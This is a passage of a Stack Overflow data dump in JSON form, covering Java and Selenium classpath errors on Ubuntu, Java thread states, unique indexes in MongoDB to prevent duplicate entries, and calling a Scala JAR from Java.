org.testng.Assert.fail;\r\n^\r\nTestNGSandBox.java:47: error: package org.openqa.selenium does not exist\r\nimport org.openqa.selenium.By;\r\n```\r\n\r\nThe way I transfered the project from Windows was that copied whole project folder and pasted in Ubuntu home directory. Then I just type command like.\r\n\r\n`\r\njava TestNGSandBox.java\r\n`\r\n\r\nMany solutions I found are talking about Desktop version of Ubuntu.\r\n\r\nI am practically new to Java so there must be something I missed while I am porting. So if you give me a tip, that would be super super great.\r\n\r\nThank you in advance.\r\n","title":"How can I transfer Java project from Windows to Ubuntu 20.04? (NO GUI version)","body":"<p>I am trying to run my Selenium code in Ubuntu server and I saw some articles that Java is indenpendent with OS so I thought my Java selenium code would run without any configurations.</p>\n<p>However, when I run my Selenium code in Ubuntu server, it comes out heaps of error followings</p>\n<pre><code>TestNGSandBox.java:16: error: package org.testng does not exist\nimport static org.testng.Assert.assertEquals;\n                        ^\nTestNGSandBox.java:16: error: static import only from classes and interfaces\nimport static org.testng.Assert.assertEquals;\n^\nTestNGSandBox.java:17: error: package org.testng does not exist\nimport static org.testng.Assert.assertFalse;\n                        ^\nTestNGSandBox.java:17: error: static import only from classes and interfaces\nimport static org.testng.Assert.assertFalse;\n^\nTestNGSandBox.java:18: error: package org.testng does not exist\nimport static org.testng.Assert.assertTrue;\n                        ^\nTestNGSandBox.java:18: error: static import only from classes and interfaces\nimport static org.testng.Assert.assertTrue;\n^\nTestNGSandBox.java:19: error: package org.testng does not exist\nimport static org.testng.Assert.fail;\n                        ^\nTestNGSandBox.java:19: error: static import only from classes and interfaces\nimport static org.testng.Assert.fail;\n^\nTestNGSandBox.java:47: error: package org.openqa.selenium does not exist\nimport org.openqa.selenium.By;\n</code></pre>\n<p>The way I transfered the project from Windows was that copied whole project folder and pasted in Ubuntu home directory. Then I just type command like.</p>\n<p><code>java TestNGSandBox.java</code></p>\n<p>Many solutions I found are talking about Desktop version of Ubuntu.</p>\n<p>I am practically new to Java so there must be something I missed while I am porting. So if you give me a tip, that would be super super great.</p>\n<p>Thank you in advance.</p>\n"},{"tags":["java","multithreading"],"comments":[{"owner":{"account_id":7237737,"reputation":11109,"user_id":5522344,"display_name":"Doc"},"score":0,"creation_date":1554639352,"post_id":55558854,"comment_id":97818069,"body_markdown":"`isAlive()` to be used here.","body":"<code>isAlive()</code> to be used here."},{"owner":{"account_id":7237737,"reputation":11109,"user_id":5522344,"display_name":"Doc"},"score":0,"creation_date":1554639512,"post_id":55558854,"comment_id":97818126,"body_markdown":"you may want to read https://stackoverflow.com/questions/17293304/when-is-a-java-thread-alive","body":"you may want to read <a href=\"https://stackoverflow.com/questions/17293304/when-is-a-java-thread-alive\" title=\"when is a java thread alive\">stackoverflow.com/questions/17293304/&hellip;</a>"},{"owner":{"account_id":1244574,"reputation":13277,"user_id":1206301,"accept_rate":10,"display_name":"Alexei Kaigorodov"},"score":0,"creation_date":1554650592,"post_id":55558854,"comment_id":97821082,"body_markdown":"how are you going to use this information? Suppose you learned that your thread is really running and decide to take some action. But O/S may in next microsecond move the thread from processor, and your action would be wrong.","body":"how are you going to use this information? Suppose you learned that your thread is really running and decide to take some action. But O/S may in next microsecond move the thread from processor, and your action would be wrong."}],"answers":[{"tags":[],"owner":{"account_id":3229192,"reputation":684,"user_id":3931900,"display_name":"Abolfazl Hashemi"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1554642215,"creation_date":1554642215,"answer_id":55559298,"question_id":55558854,"body_markdown":"As you sayed, a runnable thread may or may not actually be running. It is up to the operating system to give the thread time to run. **The Java specification does not call this as a separate state**, though. A running thread is still in the runnable state and **there is not possible to distinguish these two states via java in a simple way**.","title":"How to distinguish RUNNING state from java.lang.Thread.State.RUNNABLE in Java","body":"<p>As you sayed, a runnable thread may or may not actually be running. It is up to the operating system to give the thread time to run. <strong>The Java specification does not call this as a separate state</strong>, though. A running thread is still in the runnable state and <strong>there is not possible to distinguish these two states via java in a simple way</strong>.</p>\n"},{"tags":[],"owner":{"account_id":422870,"reputation":25925,"user_id":801894,"display_name":"Solomon Slow"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1554652405,"creation_date":1554652405,"answer_id":55560883,"question_id":55558854,"body_markdown":"Suppose that the `Thread` class defined a function, `boolean isRunning()`. What could you do with it?  This, for example, would be meaningless:\r\n\r\n    if (t.isRunning()) {\r\n        doXYandZ();\r\n    }\r\n\r\nThe problem with it is, even if thread `t` actually was RUNNING at some point during the `isRunning()` call, there&#39;s no guarantee that it will _still_ be running by the time `t.isRunning()` returns `true.`  The is no guarantee that it won&#39;t stop running sometime during the `doXYandZ()` call.\r\n\r\nThe operating system is able to distinguish between threads that are RUNNING and threads that are not because that state is controlled _by_ the operating system, and the operating system needs to remember which threads are RUNNING and which are not because it&#39;s the operating system&#39;s job to schedule them.\r\n\r\nThe Java Runtime Environment doesn&#39;t distinguish between RUNNING and RUNNABLE because it doesn&#39;t control which threads are are actually RUNNING at any given time, and it would have no way to meaningfully react to changes in that state.","title":"How to distinguish RUNNING state from java.lang.Thread.State.RUNNABLE in Java","body":"<p>Suppose that the <code>Thread</code> class defined a function, <code>boolean isRunning()</code>. What could you do with it?  This, for example, would be meaningless:</p>\n\n<pre><code>if (t.isRunning()) {\n    doXYandZ();\n}\n</code></pre>\n\n<p>The problem with it is, even if thread <code>t</code> actually was RUNNING at some point during the <code>isRunning()</code> call, there's no guarantee that it will <em>still</em> be running by the time <code>t.isRunning()</code> returns <code>true.</code>  The is no guarantee that it won't stop running sometime during the <code>doXYandZ()</code> call.</p>\n\n<p>The operating system is able to distinguish between threads that are RUNNING and threads that are not because that state is controlled <em>by</em> the operating system, and the operating system needs to remember which threads are RUNNING and which are not because it's the operating system's job to schedule them.</p>\n\n<p>The Java Runtime Environment doesn't distinguish between RUNNING and RUNNABLE because it doesn't control which threads are are actually RUNNING at any given time, and it would have no way to meaningfully react to changes in that state.</p>\n"},{"tags":[],"owner":{"account_id":7923403,"reputation":39,"user_id":5983602,"display_name":"chen kqing"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642487979,"creation_date":1642477598,"answer_id":70750063,"question_id":55558854,"body_markdown":"Because java thread depends on os thread.OS example,linux process status R(task_running)is contain running and scheduled to run in the run queue(ready status)","title":"How to distinguish RUNNING state from java.lang.Thread.State.RUNNABLE in Java","body":"<p>Because java thread depends on os thread.OS example,linux process status R(task_running)is contain running and scheduled to run in the run queue(ready status)</p>\n"}],"owner":{"account_id":6829513,"reputation":3942,"user_id":5254103,"accept_rate":0,"display_name":"BaiJiFeiLong"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1876,"favorite_count":0,"down_vote_count":0,"up_vote_count":6,"accepted_answer_id":55560883,"answer_count":3,"score":6,"last_activity_date":1642487979,"creation_date":1554638923,"question_id":55558854,"body_markdown":"When a thread is `RUNNABLE`, it can be running, or be not. Is there a way to distinguish it from `java.lang.Thread.State#RUNNABLE`?\r\n\r\nAll states of threads in Java doc:\r\n\r\n&gt; java.lang public class Thread.State\r\n\r\n&gt; extends Enum&lt;Thread.State&gt;\r\n\r\n&gt; A thread state. A thread can be in one of the following states:\r\n\r\n&gt; NEW A thread that has not yet started is in this state.\r\n\r\n&gt; RUNNABLE A thread executing in the Java virtual machine is in this state.\r\n\r\n&gt; BLOCKED A thread that is blocked waiting for a monitor lock is in this state.\r\n\r\n&gt; WAITING A thread that is waiting indefinitely for another thread to perform a particular action is in this state.\r\n\r\n&gt; TIMED_WAITING A thread that is waiting for another thread to perform an action for up to a specified waiting time is in this state.\r\n\r\n&gt; TERMINATED A thread that has exited is in this state.\r\n\r\n&gt; A thread can be in only one state at a given point in time. These states are virtual machine states which do not reflect any operating system thread states.\r\n\r\n    package bj.thread;\r\n\r\n    public class ThreadApp2 {\r\n\r\n        public static void main(String[] args) {\r\n            System.out.println(Thread.currentThread().getState());\r\n        }\r\n    }\r\n\r\nThe output:\r\n\r\n    RUNNABLE","title":"How to distinguish RUNNING state from java.lang.Thread.State.RUNNABLE in Java","body":"<p>When a thread is <code>RUNNABLE</code>, it can be running, or be not. Is there a way to distinguish it from <code>java.lang.Thread.State#RUNNABLE</code>?</p>\n\n<p>All states of threads in Java doc:</p>\n\n<blockquote>\n  <p>java.lang public class Thread.State</p>\n  \n  <p>extends Enum</p>\n  \n  <p>A thread state. A thread can be in one of the following states:</p>\n  \n  <p>NEW A thread that has not yet started is in this state.</p>\n  \n  <p>RUNNABLE A thread executing in the Java virtual machine is in this state.</p>\n  \n  <p>BLOCKED A thread that is blocked waiting for a monitor lock is in this state.</p>\n  \n  <p>WAITING A thread that is waiting indefinitely for another thread to perform a particular action is in this state.</p>\n  \n  <p>TIMED_WAITING A thread that is waiting for another thread to perform an action for up to a specified waiting time is in this state.</p>\n  \n  <p>TERMINATED A thread that has exited is in this state.</p>\n  \n  <p>A thread can be in only one state at a given point in time. These states are virtual machine states which do not reflect any operating system thread states.</p>\n</blockquote>\n\n<pre><code>package bj.thread;\n\npublic class ThreadApp2 {\n\n    public static void main(String[] args) {\n        System.out.println(Thread.currentThread().getState());\n    }\n}\n</code></pre>\n\n<p>The output:</p>\n\n<pre><code>RUNNABLE\n</code></pre>\n"},{"tags":["java","mongodb","mongodb-java"],"answers":[{"tags":[],"owner":{"account_id":162175,"reputation":43412,"user_id":383478,"accept_rate":98,"display_name":"Sammaye"},"down_vote_count":1,"up_vote_count":1,"is_accepted":false,"score":0,"last_activity_date":1479205451,"creation_date":1346310455,"answer_id":12191615,"question_id":12191311,"body_markdown":"I am not a Java programmer however you can probably convert this over.\r\n\r\nMongoDB by default does have a primary key known as the `_id` you can use `upsert()` or `save()` on this key to prevent the document from being written twice like so:\r\n\r\n    var doc = {&#39;name&#39;: &#39;sam&#39;};\r\n    db.users.insert(doc); // doc will get an _id assigned to it\r\n    db.users.insert(doc); // Will fail since it already exists\r\n\r\nThis will stop immediately duplicates. As to multithread safe inserts under certain conditions: well, we would need to know more about your condition in that case.\r\n\r\nI should add however that the `_id` index is unqiue by default.","title":"Mongodb avoid duplicate entries","body":"<p>I am not a Java programmer however you can probably convert this over.</p>\n\n<p>MongoDB by default does have a primary key known as the <code>_id</code> you can use <code>upsert()</code> or <code>save()</code> on this key to prevent the document from being written twice like so:</p>\n\n<pre><code>var doc = {'name': 'sam'};\ndb.users.insert(doc); // doc will get an _id assigned to it\ndb.users.insert(doc); // Will fail since it already exists\n</code></pre>\n\n<p>This will stop immediately duplicates. As to multithread safe inserts under certain conditions: well, we would need to know more about your condition in that case.</p>\n\n<p>I should add however that the <code>_id</code> index is unqiue by default.</p>\n"},{"tags":[],"owner":{"account_id":900623,"reputation":14220,"user_id":936869,"accept_rate":81,"display_name":"theon"},"down_vote_count":1,"up_vote_count":48,"is_accepted":true,"score":47,"last_activity_date":1614112916,"creation_date":1346310692,"answer_id":12191674,"question_id":12191311,"body_markdown":"Use an index with the `{unique:true}` option.\r\n    \r\n    // everyone&#39;s username must be unique:\r\n    db.users.createIndex({email:1},{unique:true});\r\n\r\nYou can also do this across multiple fields. _See [this section][1]_ in the docs for more details and examples.\r\n\r\n&gt; A unique index ensures that the indexed fields do not store duplicate values; i.e. enforces uniqueness for the indexed fields. By default, MongoDB creates a unique index on the _id field during the creation of a collection.\r\n\r\nIf you wish for `null` values to be ignored from the unique key, then you have to also make the index sparse (_see [here][2]_), by also adding the `sparse` option:\r\n\r\n    // everyone&#39;s username must be unique,\r\n    //but there can be multiple users with no email field or a null email:\r\n    db.users.createIndex({email:1},{unique:true, sparse:true});\r\n\r\nIf you want to create the index using the MongoDB Java Driver. Try:\r\n    \r\n    Document keys = new Document(&quot;email&quot;, 1);\r\n    collection.createIndex(keys, new IndexOptions().unique(true));\r\n\r\n  [1]: https://docs.mongodb.com/manual/core/index-unique/\r\n  [2]: https://docs.mongodb.com/manual/core/index-sparse/#sparse-and-unique-properties","title":"Mongodb avoid duplicate entries","body":"<p>Use an index with the <code>{unique:true}</code> option.</p>\n<pre><code>// everyone's username must be unique:\ndb.users.createIndex({email:1},{unique:true});\n</code></pre>\n<p>You can also do this across multiple fields. <em>See <a href=\"https://docs.mongodb.com/manual/core/index-unique/\" rel=\"nofollow noreferrer\">this section</a></em> in the docs for more details and examples.</p>\n<blockquote>\n<p>A unique index ensures that the indexed fields do not store duplicate values; i.e. enforces uniqueness for the indexed fields. By default, MongoDB creates a unique index on the _id field during the creation of a collection.</p>\n</blockquote>\n<p>If you wish for <code>null</code> values to be ignored from the unique key, then you have to also make the index sparse (<em>see <a href=\"https://docs.mongodb.com/manual/core/index-sparse/#sparse-and-unique-properties\" rel=\"nofollow noreferrer\">here</a></em>), by also adding the <code>sparse</code> option:</p>\n<pre><code>// everyone's username must be unique,\n//but there can be multiple users with no email field or a null email:\ndb.users.createIndex({email:1},{unique:true, sparse:true});\n</code></pre>\n<p>If you want to create the index using the MongoDB Java Driver. Try:</p>\n<pre><code>Document keys = new Document(&quot;email&quot;, 1);\ncollection.createIndex(keys, new IndexOptions().unique(true));\n</code></pre>\n"},{"tags":[],"owner":{"account_id":36886,"reputation":2164,"user_id":105334,"accept_rate":64,"display_name":"hithwen"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1359649824,"creation_date":1359649824,"answer_id":14630572,"question_id":12191311,"body_markdown":"Theon solution didn&#39;t work for me, but this one did:\r\n\r\n    BasicDBObject query = new BasicDBObject(&lt;fieldname&gt;, 1);\r\n    collection.ensureIndex(query, &lt;index_name&gt;, true);","title":"Mongodb avoid duplicate entries","body":"<p>Theon solution didn't work for me, but this one did:</p>\n\n<pre><code>BasicDBObject query = new BasicDBObject(&lt;fieldname&gt;, 1);\ncollection.ensureIndex(query, &lt;index_name&gt;, true);\n</code></pre>\n"},{"tags":[],"owner":{"account_id":5034188,"reputation":2539,"user_id":4043524,"accept_rate":50,"display_name":"Amit Chahar"},"down_vote_count":1,"up_vote_count":2,"is_accepted":false,"score":1,"last_activity_date":1411587138,"creation_date":1411587138,"answer_id":26025000,"question_id":12191311,"body_markdown":"This can be done using &quot;_id&quot; field although this use is discouraged.\r\nsuppose you want the names to be unique, then you can put the names in &quot;_id&quot; column and as you might know &quot;_id&quot; column is unique for each entry.\r\n\r\n    BasicDBObject bdbo = new BasicDBObject(&quot;_id&quot;,&quot;amit&quot;);\r\n\r\nNow , no other entry can have name as &quot;amit&quot; in the collection.This can be one of the way you are asking for.\r\n\r\n","title":"Mongodb avoid duplicate entries","body":"<p>This can be done using \"_id\" field although this use is discouraged.\nsuppose you want the names to be unique, then you can put the names in \"_id\" column and as you might know \"_id\" column is unique for each entry.</p>\n\n<pre><code>BasicDBObject bdbo = new BasicDBObject(\"_id\",\"amit\");\n</code></pre>\n\n<p>Now , no other entry can have name as \"amit\" in the collection.This can be one of the way you are asking for.</p>\n"},{"tags":[],"owner":{"account_id":35665,"reputation":17726,"user_id":101095,"accept_rate":94,"display_name":"Cuga"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1454869523,"creation_date":1452719487,"answer_id":34777076,"question_id":12191311,"body_markdown":"As of Mongo&#39;s v3.0 Java driver, the code to create the index looks like:\r\n\r\n    public void createUniqueIndex() {\r\n        Document index = new Document(&quot;fieldName&quot;, 1);\r\n        MongoCollection&lt;Document&gt; collection = client.getDatabase(&quot;dbName&quot;).getCollection(&quot;CollectionName&quot;);\r\n        collection.createIndex(index, new IndexOptions().unique(true));\r\n    }\r\n\r\n    // And test to verify it works as expected\r\n    @Test\r\n    public void testIndex() {\r\n        MongoCollection&lt;Document&gt; collection = client.getDatabase(&quot;dbName&quot;).getCollection(&quot;CollectionName&quot;);\r\n        \r\n        Document newDoc = new Document(&quot;fieldName&quot;, &quot;duplicateValue&quot;);\r\n        collection.insertOne(newDoc);\r\n\r\n        // this will throw a MongoWriteException\r\n        try {\r\n            collection.insertOne(newDoc);\r\n            fail(&quot;Should have thrown a mongo write exception due to duplicate key&quot;);\r\n        } catch (MongoWriteException e) {\r\n            assertTrue(e.getMessage().contains(&quot;duplicate key&quot;));\r\n        }\r\n    }","title":"Mongodb avoid duplicate entries","body":"<p>As of Mongo's v3.0 Java driver, the code to create the index looks like:</p>\n\n<pre><code>public void createUniqueIndex() {\n    Document index = new Document(\"fieldName\", 1);\n    MongoCollection&lt;Document&gt; collection = client.getDatabase(\"dbName\").getCollection(\"CollectionName\");\n    collection.createIndex(index, new IndexOptions().unique(true));\n}\n\n// And test to verify it works as expected\n@Test\npublic void testIndex() {\n    MongoCollection&lt;Document&gt; collection = client.getDatabase(\"dbName\").getCollection(\"CollectionName\");\n\n    Document newDoc = new Document(\"fieldName\", \"duplicateValue\");\n    collection.insertOne(newDoc);\n\n    // this will throw a MongoWriteException\n    try {\n        collection.insertOne(newDoc);\n        fail(\"Should have thrown a mongo write exception due to duplicate key\");\n    } catch (MongoWriteException e) {\n        assertTrue(e.getMessage().contains(\"duplicate key\"));\n    }\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":957044,"reputation":47672,"user_id":982161,"accept_rate":63,"display_name":"ΦXocę 웃 Пepe&#250;pa ツ"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1559053211,"creation_date":1559053211,"answer_id":56344309,"question_id":12191311,"body_markdown":"using pymongo it looks like:\r\n\r\n    mycol.create_index(&quot;id&quot;, unique=True)\r\n\r\nwhere myCol is the collection in the DB\r\n\r\n\r\n\r\n    #!/usr/bin/env python\r\n    # -*- coding: utf-8 -*-\r\n    import pymongo\r\n    \r\n    myclient = pymongo.MongoClient(&quot;mongodb://localhost:27017/&quot;)\r\n    mydb = myclient[&quot;mydatabase&quot;]\r\n    mycol = mydb[&quot;customers&quot;]\r\n    mycol.create_index(&quot;id&quot;, unique=True)\r\n    mydict = {&quot;name&quot;: &quot;xoce&quot;, &quot;address&quot;: &quot;Highway to hell 666&quot;, &quot;id&quot;: 1}\r\n    x = mycol.insert_one(mydict)","title":"Mongodb avoid duplicate entries","body":"<p>using pymongo it looks like:</p>\n\n<pre><code>mycol.create_index(\"id\", unique=True)\n</code></pre>\n\n<p>where myCol is the collection in the DB</p>\n\n<pre><code>#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nimport pymongo\n\nmyclient = pymongo.MongoClient(\"mongodb://localhost:27017/\")\nmydb = myclient[\"mydatabase\"]\nmycol = mydb[\"customers\"]\nmycol.create_index(\"id\", unique=True)\nmydict = {\"name\": \"xoce\", \"address\": \"Highway to hell 666\", \"id\": 1}\nx = mycol.insert_one(mydict)\n</code></pre>\n"},{"tags":[],"owner":{"account_id":22480473,"reputation":23,"user_id":16679627,"display_name":"anishkarthick s"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642487695,"creation_date":1642486881,"answer_id":70751109,"question_id":12191311,"body_markdown":"### Prevent mongoDB to save duplicate email ###\r\n\r\n\r\n\r\n&lt;!-- language: lang-js --&gt;\r\n\r\n     UserSchema.path(&#39;email&#39;).validate(async(email)=&gt;{\r\n       const emailcount = await mongoose.models.User.countDocuments({email})\r\n       return !emailcount\r\n     }, &#39;Email already exits&#39;)\r\n\r\n\r\n\r\nMay this help ur question...\r\nworked for me..\r\nuse in user model.\r\n[refer for explaination][1]\r\nTHANKS...\r\n\r\n\r\n  [1]: https://youtu.be/Z8Aebt9tvT8\r\n\r\n","title":"Mongodb avoid duplicate entries","body":"<h3>Prevent mongoDB to save duplicate email</h3>\n<pre class=\"lang-js prettyprint-override\"><code> UserSchema.path('email').validate(async(email)=&gt;{\n   const emailcount = await mongoose.models.User.countDocuments({email})\n   return !emailcount\n }, 'Email already exits')\n</code></pre>\n<p>May this help ur question...\nworked for me..\nuse in user model.\n<a href=\"https://youtu.be/Z8Aebt9tvT8\" rel=\"nofollow noreferrer\">refer for explaination</a>\nTHANKS...</p>\n"}],"owner":{"account_id":1380147,"reputation":963,"user_id":1313339,"accept_rate":65,"display_name":"Jessie"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":43402,"favorite_count":0,"down_vote_count":0,"up_vote_count":30,"accepted_answer_id":12191674,"answer_count":7,"score":30,"last_activity_date":1642487695,"creation_date":1346309252,"question_id":12191311,"body_markdown":" I am newbie to mongodb. May I know how to avoid duplicate entries. In relational tables, we use primary key to avoid it. May I know how to specify it in Mongodb using java?\r\n","title":"Mongodb avoid duplicate entries","body":"<p>I am newbie to mongodb. May I know how to avoid duplicate entries. In relational tables, we use primary key to avoid it. May I know how to specify it in Mongodb using java?</p>\n"},{"tags":["java","scala","intellij-idea"],"comments":[{"owner":{"account_id":2645973,"reputation":65777,"user_id":2288659,"accept_rate":90,"display_name":"Silvio Mayolo"},"score":0,"creation_date":1642389526,"post_id":70736128,"comment_id":125049789,"body_markdown":"See [minimal, reproducible example](https://stackoverflow.com/help/minimal-reproducible-example). There&#39;s no Scala code here, and with only an `import` to go on, it could be &quot;the file doesn&#39;t exist&quot;, &quot;your classpath is wrong&quot;, or any number of basic configuration details. What does the Scala code in question look like?","body":"See <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal, reproducible example</a>. There&#39;s no Scala code here, and with only an <code>import</code> to go on, it could be &quot;the file doesn&#39;t exist&quot;, &quot;your classpath is wrong&quot;, or any number of basic configuration details. What does the Scala code in question look like?"},{"owner":{"account_id":2026267,"reputation":1220,"user_id":1811159,"accept_rate":27,"display_name":"Nicholas Humphrey"},"score":0,"creation_date":1642389680,"post_id":70736128,"comment_id":125049816,"body_markdown":"@SilvioMayolo it&#39;s an imported jar. I can show the decompiled code, just a moment.","body":"@SilvioMayolo it&#39;s an imported jar. I can show the decompiled code, just a moment."},{"owner":{"account_id":2026267,"reputation":1220,"user_id":1811159,"accept_rate":27,"display_name":"Nicholas Humphrey"},"score":0,"creation_date":1642389862,"post_id":70736128,"comment_id":125049841,"body_markdown":"@SilvioMayolo done, added decompiled code","body":"@SilvioMayolo done, added decompiled code"},{"owner":{"account_id":2645973,"reputation":65777,"user_id":2288659,"accept_rate":90,"display_name":"Silvio Mayolo"},"score":1,"creation_date":1642390230,"post_id":70736128,"comment_id":125049890,"body_markdown":"It must be a local classpath issue with the way you&#39;re invoking the JAR. If I create those two `.java` files verbatim with the correct directory structure (and the missing semicolon on the `import`) then everything works. So whatever is happening is local to your dev environment.","body":"It must be a local classpath issue with the way you&#39;re invoking the JAR. If I create those two <code>.java</code> files verbatim with the correct directory structure (and the missing semicolon on the <code>import</code>) then everything works. So whatever is happening is local to your dev environment."},{"owner":{"account_id":2026267,"reputation":1220,"user_id":1811159,"accept_rate":27,"display_name":"Nicholas Humphrey"},"score":0,"creation_date":1642390394,"post_id":70736128,"comment_id":125049913,"body_markdown":"@SilvioMayolo Just a note I got a warning &quot;Instantiation of utility class VerifyApp()&quot;. I Googled a bit and found that utility class is usually created with a private consturctor, I guess that could also be the reason (but not sure why it doesn&#39;t show up in the decompiled code)","body":"@SilvioMayolo Just a note I got a warning &quot;Instantiation of utility class VerifyApp()&quot;. I Googled a bit and found that utility class is usually created with a private consturctor, I guess that could also be the reason (but not sure why it doesn&#39;t show up in the decompiled code)"},{"owner":{"account_id":1328608,"reputation":16312,"user_id":1272950,"display_name":"yǝsʞǝla"},"score":1,"creation_date":1642390402,"post_id":70736128,"comment_id":125049915,"body_markdown":"Have you tried: `VerifyApp$.MODULE$.main(args);` or something along these lines? https://lampwww.epfl.ch/~michelou/scala/using-scala-from-java.html. If it&#39;s originally defined in a object App.main then you can call it directly: `App.main(args)`.","body":"Have you tried: <code>VerifyApp$.MODULE$.main(args);</code> or something along these lines? <a href=\"https://lampwww.epfl.ch/~michelou/scala/using-scala-from-java.html\" rel=\"nofollow noreferrer\">lampwww.epfl.ch/~michelou/scala/using-scala-from-java.html</a>. If it&#39;s originally defined in a object App.main then you can call it directly: <code>App.main(args)</code>."},{"owner":{"account_id":2026267,"reputation":1220,"user_id":1811159,"accept_rate":27,"display_name":"Nicholas Humphrey"},"score":0,"creation_date":1642390559,"post_id":70736128,"comment_id":125049930,"body_markdown":"@yǝsʞǝla yeah I tried, seems to be private so I can&#39;t call those.","body":"@yǝsʞǝla yeah I tried, seems to be private so I can&#39;t call those."},{"owner":{"account_id":1328608,"reputation":16312,"user_id":1272950,"display_name":"yǝsʞǝla"},"score":0,"creation_date":1642390629,"post_id":70736128,"comment_id":125049939,"body_markdown":"main must be public to be an entry point","body":"main must be public to be an entry point"},{"owner":{"account_id":1328608,"reputation":16312,"user_id":1272950,"display_name":"yǝsʞǝla"},"score":1,"creation_date":1642390743,"post_id":70736128,"comment_id":125049952,"body_markdown":"Check when you run it, does it include `scala-library.jar` on classpath.","body":"Check when you run it, does it include <code>scala-library.jar</code> on classpath."},{"owner":{"account_id":1328608,"reputation":16312,"user_id":1272950,"display_name":"yǝsʞǝla"},"score":1,"creation_date":1642390912,"post_id":70736128,"comment_id":125049975,"body_markdown":"BTW this is a valid question, so I don&#39;t know why people try to downvote or close it. Let&#39;s keep it alive. It&#39;s a valid problem of Java/Scala interop.","body":"BTW this is a valid question, so I don&#39;t know why people try to downvote or close it. Let&#39;s keep it alive. It&#39;s a valid problem of Java/Scala interop."},{"owner":{"account_id":2026267,"reputation":1220,"user_id":1811159,"accept_rate":27,"display_name":"Nicholas Humphrey"},"score":0,"creation_date":1642391128,"post_id":70736128,"comment_id":125050008,"body_markdown":"@yǝsʞǝla I cannot run it at the moment, it doesn&#39;t pass Build. BTW IntelliJ indicates VerifyApp is a utility class, does this ring a bell? I Googled a bit and looks like I should be able to directly call main() using: `VerifyApp().main(args)`, sadly it doesn&#39;t work either. It does pass Build but shows another error: NoClassDefFoundError. BTW it does have the jar on classpath.","body":"@yǝsʞǝla I cannot run it at the moment, it doesn&#39;t pass Build. BTW IntelliJ indicates VerifyApp is a utility class, does this ring a bell? I Googled a bit and looks like I should be able to directly call main() using: <code>VerifyApp().main(args)</code>, sadly it doesn&#39;t work either. It does pass Build but shows another error: NoClassDefFoundError. BTW it does have the jar on classpath."},{"owner":{"account_id":1328608,"reputation":16312,"user_id":1272950,"display_name":"yǝsʞǝla"},"score":0,"creation_date":1642391244,"post_id":70736128,"comment_id":125050021,"body_markdown":"I would suggest to create a toy example without that JAR. You can build your own JAR so you would be sure about the `main` method and how to call it.","body":"I would suggest to create a toy example without that JAR. You can build your own JAR so you would be sure about the <code>main</code> method and how to call it."},{"owner":{"account_id":1328608,"reputation":16312,"user_id":1272950,"display_name":"yǝsʞǝla"},"score":1,"creation_date":1642391368,"post_id":70736128,"comment_id":125050041,"body_markdown":"I would just add that JAR and Scala JAR to the libraries in IntelliJ and try to compile/run. I&#39;m not sure what is a utility class. Usually all libraries come as JARs and that&#39;s all we need.","body":"I would just add that JAR and Scala JAR to the libraries in IntelliJ and try to compile/run. I&#39;m not sure what is a utility class. Usually all libraries come as JARs and that&#39;s all we need."},{"owner":{"account_id":2026267,"reputation":1220,"user_id":1811159,"accept_rate":27,"display_name":"Nicholas Humphrey"},"score":0,"creation_date":1642391569,"post_id":70736128,"comment_id":125050077,"body_markdown":"@yǝsʞǝla I created a toy example and has no issue calling the main(). I don&#39;t know Scala so probably I didn&#39;t understand method calling correctly. Thanks for the help, I&#39;ll speak to the jar author tomorrow.","body":"@yǝsʞǝla I created a toy example and has no issue calling the main(). I don&#39;t know Scala so probably I didn&#39;t understand method calling correctly. Thanks for the help, I&#39;ll speak to the jar author tomorrow."},{"owner":{"account_id":1328608,"reputation":16312,"user_id":1272950,"display_name":"yǝsʞǝla"},"score":1,"creation_date":1642391575,"post_id":70736128,"comment_id":125050078,"body_markdown":"To summarize use `VerifyApp().main(args)`, add Scala and your App JAR to libraries, this will put them on classpath. It should be able to compile and run.","body":"To summarize use <code>VerifyApp().main(args)</code>, add Scala and your App JAR to libraries, this will put them on classpath. It should be able to compile and run."},{"owner":{"account_id":1328608,"reputation":16312,"user_id":1272950,"display_name":"yǝsʞǝla"},"score":1,"creation_date":1642391672,"post_id":70736128,"comment_id":125050101,"body_markdown":"This is how `main` is defined: https://docs.scala-lang.org/overviews/scala-book/hello-world-1.html or alternatively: https://docs.scala-lang.org/overviews/scala-book/hello-world-2.html","body":"This is how <code>main</code> is defined: <a href=\"https://docs.scala-lang.org/overviews/scala-book/hello-world-1.html\" rel=\"nofollow noreferrer\">docs.scala-lang.org/overviews/scala-book/hello-world-1.html</a> or alternatively: <a href=\"https://docs.scala-lang.org/overviews/scala-book/hello-world-2.html\" rel=\"nofollow noreferrer\">docs.scala-lang.org/overviews/scala-book/hello-world-2.html</a>"},{"owner":{"account_id":2026267,"reputation":1220,"user_id":1811159,"accept_rate":27,"display_name":"Nicholas Humphrey"},"score":0,"creation_date":1642392323,"post_id":70736128,"comment_id":125050212,"body_markdown":"@yǝsʞǝla thanks! Actually, I&#39;ll try to learn Scala basics quickly and maybe just create a Scala project. Doesn&#39;t seem to be a huge effort just for a few lines...","body":"@yǝsʞǝla thanks! Actually, I&#39;ll try to learn Scala basics quickly and maybe just create a Scala project. Doesn&#39;t seem to be a huge effort just for a few lines..."},{"owner":{"account_id":1328608,"reputation":16312,"user_id":1272950,"display_name":"yǝsʞǝla"},"score":1,"creation_date":1642392452,"post_id":70736128,"comment_id":125050234,"body_markdown":"Yes if you want to just call Scala code, doing it from Scala will be a little more straightforward. You can even make a small `build.sbt` and build your project with SBT and import into IntelliJ as SBT project (requires Scala plugin). In that case you can just copy JAR into `lib` dir. See my answer here: https://stackoverflow.com/questions/25129227/how-to-include-an-external-jar-file-into-the-jar-with-package.","body":"Yes if you want to just call Scala code, doing it from Scala will 